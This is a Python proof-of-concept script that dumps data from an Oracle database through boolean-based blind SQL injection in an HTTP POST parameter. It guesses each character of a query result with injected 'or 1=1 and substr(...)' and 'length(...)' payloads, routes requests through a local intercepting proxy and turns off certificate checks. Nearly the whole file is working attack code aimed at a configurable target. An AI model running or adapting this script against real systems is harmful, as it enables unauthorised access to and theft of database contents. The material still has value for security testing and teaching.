################################################################################################
#  Description:  
#  A rough HTTP POST based POC for dumping results from an Oracle database using boolean based
#  SQL injection.
#
#  Author: b0yd
#
################################################################################################

import requests
import urllib
import time

#Comment out if not using a proxy like Burp, etc
proxies = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}

#Example User Agent string
headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
           'Content-Type':'application/x-www-form-urlencoded'}
           
#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

#Set this to the parameter name for the POST request
post_param_name = "param1"

#Read file
host = "https://example.com"

#Set this to the expected string in the returned page that indicates the query ran sucessfully
success_str = "10 results"

#Set this to the beginning ascii ordinal value, ie 41=A
begin_num = 32
#Set this to the end ascii ordinal value, ie 41=A
end_num = 127

#SQL query to execute
query = "select user from dual"


#Can be used to find the length of the returned SQL string
def get_str_length(query):

  for i in range(0, 1000):
    data = "' or 1=1 and length((%s))=%d--" % (query, i)
    ret = make_request(host, data)
    if success_str in ret:
      return i
    else:
      continue

  return 0

def make_request( addr, data ):      
        
  #add post data
  p_data = urllib.urlencode({post_param_name : data})  
  
  #Setup request
  r = requests.post(addr, data = p_data, proxies=proxies, verify=False, headers=headers)
  return r.text

#Read file
def get_string(str_len, query, start_ord, end_ord):

  full_str = ''
  counter = 1
  while( len(full_str) < str_len ):

    letter_found = False
    num = start_ord
    while( num < end_ord):
      letter = full_str + chr(num)
      data = "' or 1=1 and substr((%s),1,%s)='%s'--" % (query, counter, letter)
      ret = make_request(host, data)
      if success_str in ret:
        full_str += chr(num)
        counter += 1
        letter_found = True
        break
      elif "unavailable" in ret:
        time.sleep(1)
        continue
      elif "exception" in ret:
        print "[-] SQL syntax error"
        break
      else:
        num += 1


    if letter_found == False:
      print "[-] Letter not found. Exiting"
      break

  return full_str

print "[+] Running query: '%s'" % query
str_len = 100000

#Uncomment below to find the SQL return length before trying to get the actual value
#str_len = get_str_length(query)

print "[+] Length: %d" % str_len
if str_len > 0:
    user = get_string(str_len, query, begin_num, end_num)
    print "[+] Result: %s" % user
